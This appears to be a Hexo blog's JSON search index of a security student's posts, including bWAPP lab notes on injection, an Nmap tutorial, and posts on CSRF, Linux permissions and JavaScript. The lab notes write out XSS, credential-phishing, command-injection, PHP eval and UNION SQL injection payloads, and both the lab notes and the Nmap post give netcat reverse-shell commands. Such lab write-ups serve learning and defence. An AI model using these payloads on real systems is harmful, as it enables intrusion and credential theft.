{"meta":{"title":"风景这边独好","subtitle":"小风大浪，地狱天堂","description":"我的第一个个人博客（主题样式基于Hexo）","author":"Ye-Jun","url":"http://yejuns.github.io","root":"/"},"pages":[{"title":"友情链接","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":true,"path":"links/index.html","permalink":"http://yejuns.github.io/links/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-05-06T05:18:15.029Z","updated":"2021-05-06T05:18:15.029Z","comments":false,"path":"about/index.html","permalink":"http://yejuns.github.io/about/index.html","excerpt":"","text":"个人详细介绍 平凡的世界，不平凡的你我"},{"title":"404 Not Found：该页无法显示","date":"2021-05-06T00:35:59.654Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"/404.html","permalink":"http://yejuns.github.io/404.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"repository/index.html","permalink":"http://yejuns.github.io/repository/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"categories/index.html","permalink":"http://yejuns.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"books/index.html","permalink":"http://yejuns.github.io/books/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-05-06T00:35:59.658Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"tags/index.html","permalink":"http://yejuns.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2020-summary","slug":"2020-summary","date":"2020-12-31T13:50:32.000Z","updated":"2021-05-05T18:05:55.423Z","comments":true,"path":"2020/12/31/2020-summary/","link":"","permalink":"http://yejuns.github.io/2020/12/31/2020-summary/","excerpt":"","text":"我的2020年度总结 这是自己第一次写年度总结，也是第一次写自己的个人博客，在这2020年的最后一天，简单地给自己着过去的一年做一个总结，然后展望一下未来。 想着在3月初的时候一个人在家无聊，就将自己的微信签名改成了“响风大浪，地狱天堂”，然后便决定去外面义工旅行。很庆幸自己在这样一个时刻做了这么一个决定，从而以较低的成本扩大了自己的眼界，也让我在旅行途中更加清晰地了解到了自己。从上海辗转到海南再到平潭，加上暑假里去的香格里拉与大理，认识了小听、小胖、小五姐，见到了蔚蓝的大海与梦幻的蓝眼泪，才发现这个世界真的可以如此之大，而不只是朝九晚五。闷了的时候确实可以出去走走，哪怕身无分文，但只要你愿意走出去，总是有路给我们走的。 下图是三亚的某一天晚上，在隔壁民宿与客人一起玩桌游，看到帅气小哥弹吉他的时候就想，要是自己也会弹吉他该有多好。于是8月份在云南，恰好有朋友送自己一把吉他，花了3个月的时间去入门，现在已经差不多可以练习曲子了。所以，不要做白日梦，你看到的那些只要努力，都有可能变成你的，所以只要慢慢积累，等待就好。 在这样的旅行途中，给我留下印象最深的算是小听和李礼了。小听是一个四川的女孩子，十分会玩，长的也很好看（没错，下面的背影就是小听的），遇到人特别热情。那天我在码头上看夕阳，海边的落日看上去总是比陆地上的要梦幻很多，我正沉浸在落日的温暖中，她从光晕中走来，向我微微一笑，“你好，我记得你，你也是这里的义工”。于是，我就记住了这样一个开朗的女孩子，也认识到了那些不一样的人有着不一样青春。如今的她还在海南当一名浪人，整日冲浪，祝愿她在接下来的一年心想事成。 李礼是一个很有趣的男生，是我在昆明准备回南京的路上认识的。那天他和小白正打算出动物园拍一些视频，估计是看我背着一个吉他，以为我也是喜欢在外面疯的人，小白便约我一起去，庆幸自己并没有因为要看论文而拒绝他们，不然也不会知道今日头条上那种简单的视频居然也会有人爱看，而李礼靠着制作小视频的方式已经有了几千的粉丝，尽管他才运营了2个月。上个月看到他在鹤岗买了一套房，就是不知道接下来的一年他会在什么地方拍摄什么样的视频，只是祝愿他顺顺利利。 这一年除了玩，科研上的进步并不大，而实践能力自己明显提升了很多，主要原因就是帮助LL开发rundb数据库，虽说其实自己也就改了一部分代码，但对于商用软件的要求与一整套软件开发过程的了解，自己还是有很多的提升。而且在LL的疯狂push下，完全意识到了自己的不足，面向百度编程还是不可取，基本功是一定要扎实。而前几天连续熬了3天自己的精神状态也还可以，说明自己的熬夜能力还是有很大的进步空间。未来自己的求职方向主要是逆向以及网络安全这块，开发的压力实在太大，而且提升并不多，自己还是比较看好安全防御与攻击这方面。而英文文档的阅读能力在未来还需进一步提升，学会使用开源软件以及去开源社区学习是未来一年最重要的事。 现在仔细一想，自己在这一年真的是经历了太多的事，义工旅行、加入天投会、认识小曹、学会弹吉他、开发rundb数据库。这一件一件的小事汇成了我的2020，希望我的2021年 自己以及亲朋好友都健健康康； 自己在网络安全这块技术上有重大突破； 找到一个我喜欢、也喜欢我的女朋友；","categories":[],"tags":[{"name":"2020 年度总结","slug":"2020-年度总结","permalink":"http://yejuns.github.io/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"}]},{"title":"创建我的个人博客","slug":"Ademo","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-04T02:51:32.923Z","comments":true,"path":"2020/12/31/Ademo/","link":"","permalink":"http://yejuns.github.io/2020/12/31/Ademo/","excerpt":"","text":"使用github搭建个人博客踩坑的地方","categories":[],"tags":[{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"Linux 中的安全模型","slug":"Linux 中的安全模型","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-25T08:58:17.139Z","comments":true,"path":"2020/12/31/Linux 中的安全模型/","link":"","permalink":"http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"Linux 的构成Linux 可以分为内核层和用户层。用户层通过内核层提供的操作接口，来执行各类任务 内核层提供的权限划分、进程隔离和内存保护的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。 但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。 用户层安全在 Linux 中，用户层的所有操作，都可以抽象为“主体 -&gt; 请求 -&gt; 客体”这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。 在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。Linux 用户层则需要确保权限的正确配置 Linux中的认证机制Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：/etc/passwd和/etc/shadow /etc/passwd是全局可读的，不具备保密性。因此，/etc/passwd不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的/etc/shadow中。 在/etc/shadow中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如 12chage -M 60 ye# 强制用户ye在 60 天内必须对密码进行修改 因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测 Linux 中的授权机制Linux对目录和文件除了r,w,x3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制 Linux 提供了文件属性的概念，来对文件设置更多的保护。通过chattr +i /etc/passwd可以防止文件被任何用户修改 Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如chmod +t /tmp可以阻止删除/tmp目录下其他用户的文件 要解决权限问题，我们就要实践最小权限原则。 Linux中最普遍的问题，就是滥用Root，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境 但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备ROOT权限。如果启动的是一个立即返回的进程，如CAT,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以ROOT的身份启动Redis或者 MySQL 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。 谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。 我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。 比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立守护进程(可以理解为服务)。 类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。","categories":[],"tags":[{"name":"Linux、安全","slug":"Linux、安全","permalink":"http://yejuns.github.io/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之SqlMap","slug":"SqlMap源码解析","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-21T11:08:12.602Z","comments":true,"path":"2020/12/31/SqlMap源码解析/","link":"","permalink":"http://yejuns.github.io/2020/12/31/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"","text":"SqlMap源码解析源码结构首先看一下目录结构，我们将文档类的文件排除掉，只看系统类：| 目录 | 说明 || :——: | :—– || data/ | 数据库注入检测载荷、用户自定义攻击载荷、字典、shell命令、数据库触发顺序等 || extra/ | 一些额外功能，例如发出声响（beep）、运行cmd、安全执行、shellcode等 || lib/ | 包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。 || plugins/ | 数据库信息和数据库通用事项 || tamper/ | 绕过脚本 || thirdparty/ | sqlmap使用的第三方的插件。 || sqlmap.conf | sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测） || sqlmap.py | sqlmap主程序文件 || sqlmapapi.py | sqlmap的api文件，可以将sqlmap集成到其他平台上 |","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"bwapp学习笔记-A1 Injection","slug":"bwapp-靶场题解思路A1","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-01T11:38:53.786Z","comments":true,"path":"2020/12/31/bwapp-靶场题解思路A1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/","excerpt":"","text":"网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些 HTML Injection-Reflection(Get)low level对于输入的数据没有验证，直接显示在页面上，因此可以注入XSS 123// 注入的代码&lt;script&gt;alter(124)&lt;/script&gt;&lt;a href = &quot;http://www.baidu.com&quot;&gt;click here&lt;/a&gt; medium level在源码中做了简单的字符替换（源码如下） 12345// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);# 对转换后的data还要进行url解码$input = urldecode($input); 因为对’&lt;’和’&gt;’都进行了html编码，所以在注入时可先对数据进行url编码，消除’&lt;’和’&gt;’，因为后面会对输入的数据进行url解码，所以可以注入成功。 123// 对 &lt; &gt; 经过url编码%3cscript%3ealter(124)%3c%2fscript%3e%3ca href = &quot;http://www.baidu.com&quot;%3eclick here %3c/a%3e high level使用htmlspecialchars对数据进行编码，并且制定了字符编码方式为utf-8，避免了被宽字节注入，所以很难被绕过，源码如下 123456function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities return htmlspecialchars($data, ENT_QUOTES, $encoding);&#125; 需要注意的是，同样是对输入的数据进行html编码，medium为什么可以使用url编码被绕过，而high不能被绕过。一个重要的原因是medium中对输入的数据还进行了url解码，所以注入的数据可以正常解析，从而实现攻击。 额外补充 htmlentities：将所有的字符进行html编码； htmlspecialchars：只对”&amp;,”,’,&lt;,&gt;”进行html编码 使用htmlspecialchars后，想要对其进行绕过，一种可行的方法是对注入的数据进行uft-7编码，然后将页面的编码方式也设为uft-7。 HTML Injection-Reflection(POST)与get类似 HTML Injection - Reflected (URL)主要的处理函数如下： 123456789101112case &quot;0&quot; : // $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]); $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; break; case &quot;1&quot; : $url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; break; case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break; low level使用burpsuit对发起的请求进行抓包，重新构造请求，就可以进行注入。 medium level旧的IE浏览器不会对‘&lt;’ 和 ‘&gt;’进行编码，所以可以进行DOM XSS注入 high level无法绕过(对输入进行了htmlentities) HTML Injection - Stored (Blog)low level因为有输入的文本框，先考虑是否存在存储型XSS 初次以外，我们还可以注入一个iframe进行钓鱼,比如在输入框中输入： 12345678910111213141516div class=&quot;test_code&quot;&gt;test&lt;/div&gt;&lt;div style=&quot;position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;&quot;&gt;Please Login Here To Proceed:&lt;form name=&quot;login&quot; action=&quot;http://127.0.0.1:1234/hacked.html&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;/&gt;&lt;/form&gt;&lt;/div&gt; 然后在127.0.0.1的主机上监听1234端口，比如我就使用nc监听了相关端口，nc -lvnp 1234,最后就可以得到用户的输入 medium level无法绕过 high level无法绕过 iFrame Injectionlow level根据get请求可知，直接修改ParamUrl参数即可， 原始URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250 medium level对传入的URL使用addslashes函数进行处理，只会对&#39; &quot; \\ null转义，因此依然可以绕过,只需要在ParamHeight后面闭合即可，（或者使用 iframe 标签的 srcdoc 属性替换“src”属性的内容，达到更好的注入效果） 漏洞URL：ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;h2&gt;hello&lt;/h2&gt;&lt;!-- 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot; srcdoc&gt;&lt;/iframe&gt;&lt;iframe src=https://www.baidu.com width=800 height=1000&gt;&quot; high level无法绕过 LDAP InjectionLDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。 使用得最广泛的LDAP：ADAM和OpenLDAP。 OS Command Injectionlow使用了shell_exec()方法，且没有过滤，可用命令 www.nsa.gov; cat /etc/passwd www.nsa.gov &amp; uname -a www.nsa.gov | ps -ef 这种情况下，甚至可以获得一个反弹shell，www.nsa.gov ; nc -vlp 1234 -e /bin/bash medium源码中对‘;’ ‘&amp;’进行了过滤，但仍然可以使用| high源码中使用了escapeshellcmd函数，确保用户只执行一个命令 OS Command Injection-Blind盲注的思想在于根据请求的时间，来判断命令是否运行成功。 PHP Code Injectionlow根据首页可以推测，肯定是通过url进行php相关脚本的注入。 原始url：http://192.168.50.151/phpi.php 恶意url：http://192.168.50.151/phpi.php?message=phpinfo() 造成代码注入的原因是没有对输入进行过滤，源码如下 1&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;) medium &amp; high无法绕过，对输入进行了转义，源码如下： 1&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt; SQL Injection (GET/Search)low 对于sql注入，我们首先要找到注入点 然后确定字段数 121&#x27; order by 8#1&#x27; order by 7# 确定可注入的字段的位置,构造相关的字段 121&#x27; union select 1,2,3,4,5,6,7#1&#x27; union select 1,database(),version(),user(),5,6,7# 使用同样的构造方法可以确认出表名、数据库名,用户名 1231&#x27; union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables#1&#x27; union select 1,login,Password,email,secret,6,7 from users# 也可以直接用sqlmap跑出来 sqlmap -u &quot;http://192.168.50.151/sqli_1.php?title=aaa&amp;action=search&quot; medium对输入的数据进行了addslashes处理，addslashes只会对&#39; &quot; \\进行转义操作，绕过方式 宽字节注入（数据库默认是latin1编码，要想注入成功，需要将编码改为GBK） 编码解码导致的绕过（原因是字符串在带入查询前，被做了一些编码解码操作而没有再做一次过滤） 后面的大致思路都差不多","categories":[],"tags":[{"name":"bwapp、injection","slug":"bwapp、injection","permalink":"http://yejuns.github.io/tags/bwapp%E3%80%81injection/"}]},{"title":"js原型链","slug":"js原型链","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-01T03:21:56.544Z","comments":true,"path":"2020/12/31/js原型链/","link":"","permalink":"http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/","excerpt":"","text":"重点原型链最重要的是记住这三点 __proto__、 constructor 属性是对象所独有的； prototype 属性是函数独有的； 上面说过js中函数也是对象的一种，那么函数同样也有属性__proto__、 constructor； 也就是说，普通对象（比如 {a:1}）没有prototype属性—不明白 前置知识 想要弄清楚原型和原型链，这几个属性必须要搞清楚，__proto__ 、prototype 、 constructor。 其次你要知道js中对象和函数的关系，函数其实是对象的一种。 最后你要知道函数、构造函数的区别，任何函数都可以作为构造函数，但是并不能将任意函数叫做构造函数，只有当一个函数通过new关键字调用的时候才可以成为构造函数。如：1234567var Parent = function()&#123;&#125;//定义一个函数，那它只是一个普通的函数，下面我们让这个函数变得不普通var p1 = new Parent();//这时这个Parent就不是普通的函数了，它现在是一个构造函数。因为通过new关键字调用了它//创建了一个Parent构造函数的实例 p1 prototype属性它是函数独有的属性，从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。prototype设计之初就是为了实现继承，让由特定函数创建的所有实例共享属性和方法，也可以说是让某一个构造函数实例化的所有对象可以找到公共的方法和属性。有了prototype我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。继续引用上面的代码，当我们想为通过Parent实例化的所有实例添加一个共享的属性时， 1Parent.prototype.name &#x3D; &quot;我是原型属性，所有实例都可以读取到我&quot;; 这就是原型属性，当然也可以添加原型方法。那问题来了，p1怎么知道他的原型对象上有这个方法呢，往下看↓↓↓ proto属性1__proto__属性相当于指向prototype唯一的指针 __proto__ 属性告诉我们一个对象的原型是什么. 我们说了，Parent.prototype上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过__proto__属性。每个对象都有__proto__属性，该属性指向的就是该对象的原型。 1p1.__proto__ === Parent.prototype; // true p1.prototype 是错误的(可以理解为，在new出一个实例对象后，需要让new出的对象可以指向原型，因此设置了_proto_属性) __proto__通常称为隐式原型，prototype通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。我们之前也说过__proto__属性是对象（包括函数）独有的，那么Parent.prototype也是对象，那它有隐式原型么？又指向谁？ 1Parent.prototype.__proto__ === Object.prototype; //true 可以看到，构造函数的原型对象上的隐式原型对象指向了Object的原型对象。那么Parent的原型对象就继承了Object的原型对象。由此我们可以验证一个结论，万物继承自Object.prototype。这也就是为什么我们可以实例化一个对象，并且可以调用该对象上没有的属性和方法了。如： 12//我们并没有在Parent中定义任何方法属性，但是我们可以调用p1.toString();//hasOwnProperty 等等的一些方法 我们可以调用很多我们没有定义的方法，这些方法是哪来的呢？现在引出原型链的概念，当我们调用p1.toString()的时候，先在p1对象本身寻找，没有找到则通过p1.__proto__找到了原型对象Parent.prototype，也没有找到，又通过Parent.prototype.__proto__找到了上一层原型对象Object.prototype。在这一层找到了toString方法。返回该方法供p1使用。 当然如果找到Object.prototype上也没找到，就在Object.prototype.__proto__中寻找，但是Object.prototype.__proto__ === null所以就返回undefined。这就是为什么当访问对象中一个不存在的属性时，返回undefined了。 constructor属性12345function Person(age)&#123; this.age = age;&#125;var per1 = new Person(12);var per2 = new Person(13); 上面的例子中per1、per2都是Person的实例，这两个实例都有一个constructor属性，该属性（是一个指针）指向Person。（要把Person（）看成是构造函数） 1console.log(per1.constructor &#x3D;&#x3D; per2.constructor &#x3D;&#x3D; Person); &#x2F;&#x2F;true 函数的prototype对象都包含一个constructor的属性，constructor指向当前构造函数","categories":[],"tags":[{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"}]},{"title":"web安全之CSRF","slug":"web安全之CSRF","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-24T00:42:16.623Z","comments":true,"path":"2020/12/31/web安全之CSRF/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/","excerpt":"","text":"CSRF数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。 如果攻击者控制了用户浏览器并且窃取了cookie。 浏览器会自动完成Cookie 的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。 CSRF的原因HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。 用户A 在很短的时间间隔内向Web服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。 假设用户在网站A的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为HTTP 并不知道你已经登录，它不会维持你的登录状态。 为了让服务器能够记住用户引入了Cookie 机制。","categories":[],"tags":[{"name":"CSRF 、攻击","slug":"CSRF-、攻击","permalink":"http://yejuns.github.io/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/"}]},{"title":"web安全之Nmap使用","slug":"web安全之NMap使用","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-29T11:03:25.948Z","comments":true,"path":"2020/12/31/web安全之NMap使用/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"NmapNmap是被专业人员广泛使用的一款功能全面的端口扫描工具 安装kali上已经自带，windows上去官网下载相关的安装包，centos就直接 yum install nmap 简单入门刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 nmap your-ip（域名） 就可以扫描出其对外开放的服务。 123456789101112nmap 192.168.31.13#基本格式，会扫描该主机的所有端口nmap -p 8080 192.168.31.13# 判断指定ip是否开放指定端口 nmap -p 22,21,80 192.168.31.13nmap -p 22,21,80 192.168.31.1-253# 增加端口和网段 nmap 192.168.31.1/24# 扫描整个子网的端口，这个过程可能会比较久 进阶Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种 Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务） Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口） Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致 Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。 Open|filtered Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型 Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态， 以下是一些例子 12345678910111213141516171819nmap -O 192.168.31.13 -p 8080#操作系统检测（-O）nmap -Pn 80 192.168.31.13# 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作nmap -A 192.168.31.13 -p 8080# 强力检测选项（-A），Nmap将检测目标主机的下述信息# 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）nmap -sT 192.168.31.1# TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来nmap -sS 192.168.31.1# SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式namp -sN 192.168.31.1namp -sF 192.168.31.1#TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。 UDP扫描nmap -sU 192.168.1.1 Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。 优化方法主要是: 进行并发的UDP扫描； 优先扫描常用端口； 在防火墙后面扫描； 启用–host-timeout选项以跳过响应过慢的主机。 假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP） 使用命令 nmap -sU 192.168.56.103 -p 53,161 目标端口选项默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。 1234567-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p 1-1024。扫描1 〜65535端口时，可使用-p-选项。-F（快速扫描）：将仅扫描100 个常用端口。-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。-top-ports &lt;1 or=&quot;&quot; greater=&quot;&quot;&gt;：扫描nmap-services 里排名前N的端口。 Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE） 12nmap -p1-65000 -sV 192.168.1.1#扫描目标ip的1-65000端口，并进行服务版本识别 NC由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能 123456nc -l -p 80 #监听本机的TCP80端口nc -nvv 192.168.x.x 80 #连到192.168.x.x的TCP80端口nc -e /bin/bash 192.168.0.1 33# 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机","categories":[],"tags":[{"name":"web安全、Nmap","slug":"web安全、Nmap","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/"}]},{"title":"web安全之RCE","slug":"web安全之RCE ","date":"2020-12-31T08:01:51.000Z","updated":"2021-05-19T16:10:40.796Z","comments":true,"path":"2020/12/31/web安全之RCE /","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/","excerpt":"","text":"RCE程序对输入检测不到位，导致攻击者可以执行非预期的代码和系统命令，从而能够获取Webshell。 在nodejs项目中，如果出现模板注入攻击，往往会升级为RCE","categories":[],"tags":[{"name":"xss、攻击","slug":"xss、攻击","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"}]},{"title":"web安全之SQL注入一","slug":"web安全之SQL注入-1","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-07T08:46:00.915Z","comments":true,"path":"2020/12/31/web安全之SQL注入-1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/","excerpt":"","text":"SQL注入的原理是发生于应用程序与数据库层的安全漏洞 网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。 简单示例12345select id,name from test where id=1 # 用户输入，用 1 or 1=1 代替 1select id,name from test where id=1 or 1=1# 最后产生的效果类似 select id,name from test# 实现了一个越权操作 